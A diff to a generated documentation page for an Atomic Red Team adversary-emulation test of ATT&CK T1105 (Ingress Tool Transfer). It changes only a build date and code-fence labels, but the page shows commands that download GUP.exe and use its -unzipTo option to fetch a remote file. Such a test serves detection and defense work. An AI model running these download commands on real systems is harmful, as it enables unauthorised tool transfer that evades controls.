@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "66ee226e-64cb-4dae-80e3-5bf5763e4a51"
@@ -72,13 +72,13 @@ Gup.exe binary must exist on disk at specified location (#{gup_executable})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{gup_executable}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{gup_executable}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/bin/GUP.exe" -OutFile "#{gup_executable}"
 ```
@@ -90,7 +90,7 @@ Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team
 
 ### Command
 
-```commandprompt
+```cmd
 mkdir "c:\Temp"
 cd #{working_dir}
 GUP.exe -unzipTo "" "C:\Temp" "Sample #{target_file_url} #{target_file_sha256}"
@@ -98,7 +98,7 @@ GUP.exe -unzipTo "" "C:\Temp" "Sample #{target_file_url} #{target_file_sha256}"
 
 ### Cleanup
 
-```commandprompt
+```cmd
 rmdir /s /q "C:\Temp\Sample" >nul 2>nul
 ```
 
